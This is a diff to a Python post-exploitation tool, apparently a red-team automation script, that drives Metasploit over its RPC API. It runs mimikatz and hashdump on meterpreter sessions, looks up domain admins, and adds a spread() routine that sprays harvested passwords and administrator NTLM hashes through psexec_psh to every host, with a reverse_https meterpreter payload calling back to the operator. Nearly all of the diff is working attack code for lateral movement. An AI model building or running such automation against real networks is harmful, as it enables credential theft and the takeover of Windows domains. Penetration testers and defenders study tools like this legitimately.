@@ -20,7 +20,8 @@ DOMAIN_DATA = {'domain':None,
                'domain_controllers':[], 
                'high_priority_ips':[], 
                'creds':[],
-               'IPs_in_scope':[],
+               'checked_creds':{},
+               'hosts':[],
                'checked_hosts':[]}
 
 def parse_args():
@@ -60,6 +61,7 @@ def print_great(msg, sess_num):
 def kill_tasks():
     print()
     print_info('Killing tasks then exiting', None)
+    embed()
     for task in asyncio.Task.all_tasks():
         task.cancel()
 
@@ -176,7 +178,6 @@ async def sess_first_check(client, sess_num):
         sess_num_str = str(sess_num)
         ip = NEW_SESS_DATA[sess_num][b'tunnel_peer'].split(b':')[0]
         ip_data = b'IP              : '+ip
-        DOMAIN_DATA['checked_hosts'].append(ip)
         NEW_SESS_DATA[sess_num][b'session_number'] = sess_num_str.encode()
         NEW_SESS_DATA[sess_num][b'first_check'] = b'False'
 
@@ -267,7 +268,7 @@ async def migrate_custom_proc(client, sess_num):
     if pid != cur_pid:
         # Migrate to pid
         cmd = 'migrate '+pid.decode('utf8')
-        end_strs = [b'Migration completed successfully.']
+        end_strs = [b'Migration completed successfully.', b'Session is already in target process']
         output, err = await run_session_cmd(client, sess_num, cmd, end_strs)
 
 async def run_priv_migrate(client, sess_num):
@@ -291,7 +292,14 @@ async def check_privs(client, sess_num):
 
     else:
         split_out = output.splitlines()
-        user_info_list = split_out[5].split()
+
+        # Sometimes gets extra output from priv_migrate in this output
+        offset = 5
+        for id,l in enumerate(split_out):
+            if b'True' in l or b'False' in l:
+                offset = id
+
+        user_info_list = split_out[offset].split()
         system = user_info_list[1]
         user = user_info_list[5]
         admin_shell = user_info_list[0]
@@ -366,7 +374,7 @@ async def get_DCs_DAs(client, sess_num):
 
     # Update domain data
     if b'domain' in NEW_SESS_DATA[sess_num]:
-        DOMAIN_DATA['domain'] = NEW_SESS_DATA[sess_num][b'domain']
+        DOMAIN_DATA['domain'] = NEW_SESS_DATA[sess_num][b'domain'].decode('utf8')
 
     # If no domain admin list found yet then find them
     if NEW_SESS_DATA[sess_num][b'domain_joined'] == b'True':
@@ -402,7 +410,7 @@ async def run_userhunter(client, sess_num):
         return
 
     ps_cmd = 'Find-DomainUser'
-    output, err = await run_powershell_cmd(client, sess_num, ps_cmd):
+    output, err = await run_powershell_cmd(client, sess_num, ps_cmd)
     if err:
         return
 
@@ -428,7 +436,7 @@ async def run_mimikatz(client, sess_num):
     global DOMAIN_DATA
 
     plugin = 'mimikatz'
-    await output, err = load_met_plugin(client, sess_num, plugin)
+    output, err = await load_met_plugin(client, sess_num, plugin)
     if err:
         return
 
@@ -534,6 +542,127 @@ async def run_hashdump(client, sess_num):
             msg = 'Hashdump creds - '+l
             print_great(msg, sess_num)
 
+def get_console_ids(client):
+    c_ids = [x[b'id'] for x in client.call('console.list')[b'consoles']]
+
+    print_info('Opening Metasploit consoles', None)
+    while len(c_ids) < 5:
+        client.call('console.create')
+        c_ids = [x[b'id'] for x in client.call('console.list')[b'consoles']] # Wait for response
+        time.sleep(2)
+
+    for c_id in c_ids:
+        client.call('console.read', [c_id])[b'data'].decode('utf8').splitlines()
+
+    return c_ids
+
+async def run_msf_module(client, c_id, ip, lhost, mod, extra_opts):
+
+    payload = 'windows/meterpreter/reverse_https'
+    cmd = create_msf_cmd(mod, ip, lhost, payload, extra_opts)
+    mod_out = await run_console_cmd(client, c_id, cmd)
+
+    return mod_out
+
+def create_msf_cmd(module_path, ip, lhost, payload, extra_opts):
+    cmds = """
+           use {}\n
+           set RHOST {}\n
+           set LHOST {}\n
+           set payload {}\n
+           {}\n
+           exploit -j -z\n
+           """.format(module_path, ip, lhost, payload, extra_opts)
+
+    return cmds
+
+async def run_console_cmd(client, c_id, cmd):
+    '''
+    Runs module and gets output
+    '''
+    print_info('Running MSF command(s):', None)
+    for l in cmd.splitlines():
+        l = l.strip()
+        if l != '':
+            print('        '+l)
+    client.call('console.write',[c_id, cmd])
+    asyncio.sleep(1)
+    asyncio.ensure_future(wait_on_busy_console(client, c_id))
+
+async def read_cur_output(client, c_id):
+    output = []
+    cur_output = client.call('console.read', [c_id])[b'data'].decode('utf8').splitlines()
+    for l in cur_output:
+        l = l.strip()
+        if l != '':
+            output.append(l)
+
+    return output
+
+async def wait_on_busy_console(client, c_id):
+    '''
+    The only way to get console busy status is through console.read or console.list
+    console.read clears the output buffer so you gotta use console.list
+    but console.list requires you know the list offset of the c_id console
+    so this ridiculous list comprehension seems necessary to avoid assuming
+    what the right list offset might be
+    '''
+    output = []
+    list_offset = int([x[b'id'] for x in client.call('console.list')[b'consoles'] if x[b'id'] is c_id][0])
+    # Get any initial output
+    output += await read_cur_output(client, c_id)
+
+    while client.call('console.list')[b'consoles'][list_offset][b'busy'] == True:
+        output += await read_cur_output(client, c_id)
+        asyncio.sleep(1)
+
+    # Get remaining output
+    output += await read_cur_output(client, c_id)
+
+    return output
+
+async def get_nonbusy_cid(client, c_ids):
+    while True:
+        for c_id in c_ids:
+            list_offset = int([x[b'id'] for x in client.call('console.list')[b'consoles'] if x[b'id'] is c_id][0])
+            if client.call('console.list')[b'consoles'][list_offset][b'busy'] == False:
+                return c_id
+        asyncio.sleep(1)
+
+async def spread(client, c_ids, lhost):
+    global DOMAIN_DATA
+
+    for c in DOMAIN_DATA['creds']:
+        if c not in DOMAIN_DATA['checked_creds']:
+            # Set up a dict where the key is the creds and the val are the hosts we checked them against
+            DOMAIN_DATA['checked_creds'][c] = []
+
+            # hash
+            if c.count(':') == 6 and c.endswith(':::'):
+                hash_split = c.split(':')
+                rid = hash_split[1]
+                if rid == '500':
+                    user = hash_split[0]
+                    lm = hash_split[2]
+                    pwd = hash_split[3] # ntlm hash
+                else:
+                    continue
+            # plaintext
+            else:
+                cred_split = c.split(':')
+                user = cred_split[0]
+                pwd = cred_split[1]
+            mod = 'windows/smb/psexec_psh'
+            extra_opts = ('set smbuser {}\n'
+                          'set smbpass {}\n'
+                          'set smbdomain {}'.format(user, pwd, DOMAIN_DATA['domain']))
+
+            for ip in DOMAIN_DATA['hosts']:
+                if ip not in DOMAIN_DATA['checked_creds'][c]:
+                    DOMAIN_DATA['checked_creds'][c].append(ip)
+                    c_id = await get_nonbusy_cid(client, c_ids)
+                    asyncio.ensure_future(run_msf_module(client, c_id, ip, lhost, mod, extra_opts))
+
 async def attack(client, sess_num):
 
     # Make sure it got the admin_shell info added
@@ -581,8 +710,9 @@ async def attack_with_session(client, session, sess_num):
     if is_session_broken(sess_num) == False:
         await attack(client, sess_num)
 
-def get_output(client, cmd, sess_num):
-    output = client.call('session.meterpreter_read', [str(sess_num)])
+def get_output(client, cmd, sess_num, error_msg):
+    sess_num_str = str(sess_num)
+    output = client.call('session.meterpreter_read', [sess_num_str])
 
     # Everythings fine
     if b'data' in output:
@@ -636,7 +766,7 @@ async def run_session_cmd(client, sess_num, cmd, end_strs, timeout=30):
     print_info('Running [{}]'.format(cmd), sess_num)
 
     while NEW_SESS_DATA[sess_num][b'busy'] == b'True':
-        await asyncio.sleep(1)
+        await asyncio.sleep(.1)
 
     NEW_SESS_DATA[sess_num][b'busy'] = b'True'
 
@@ -652,19 +782,20 @@ async def run_session_cmd(client, sess_num, cmd, end_strs, timeout=30):
     elif res[b'result'] == b'success':
 
         counter = 0
-        sleep_secs = 0.5
+        sleep_secs = 0.1
         full_output = b''
 
         try:
             while True:
                 await asyncio.sleep(sleep_secs)
 
-                output, err = get_output(client, cmd, sess_num)
-                full_output += output
+                output, err = get_output(client, cmd, sess_num, error_msg)
+                if output:
+                    full_output += output
 
                 # Error from meterpreter console
                 if err:
-                    NEW_SESS_DATA[sess_num][b'errors'].append(err_msg)
+                    NEW_SESS_DATA[sess_num][b'errors'].append(err)
                     print_bad('Meterpreter error: {}'.format(err), sess_num)
                     break
 
@@ -752,10 +883,9 @@ def add_session_keys(session, sess_num):
 
     return session
 
-async def check_for_sessions(client, loop):
+async def check_for_sessions(client, loop, c_ids, lhost):
     global NEW_SESS_DATA
 
-    #print_info('Waiting on new meterpreter session', None)
     print_waiting = True
 
     while True:
@@ -780,6 +910,10 @@ async def check_for_sessions(client, loop):
             if print_waiting:
                 print_waiting = False
                 print_info('Waiting on new meterpreter session', None) 
+
+        if DOMAIN_DATA['domain']:
+            #await spread(client, c_ids, lhost)
+            asyncio.ensure_future(spread(client, c_ids, lhost))
 
         await asyncio.sleep(1)
 
@@ -818,7 +952,7 @@ def parse_hostlist(args):
                     print_bad('Error importing host list file. Are you sure you chose the right file?')
                     sys.exit()
 
-    DOMAIN_DATA['IPs_in_scope'] = hosts
+    DOMAIN_DATA['hosts'] = hosts
 
 def main(args):
 
@@ -827,10 +961,12 @@ def main(args):
 
     client = msfrpc.Msfrpc({})
     client = get_perm_token(client)
+    c_ids = get_console_ids(client)
+    lhost = get_local_ip(get_iface())
 
     loop = asyncio.get_event_loop()
     loop.add_signal_handler(signal.SIGINT, kill_tasks)
-    task = check_for_sessions(client, loop)
+    task = check_for_sessions(client, loop, c_ids, lhost)
     try:
         loop.run_until_complete(task)
     except asyncio.CancelledError:
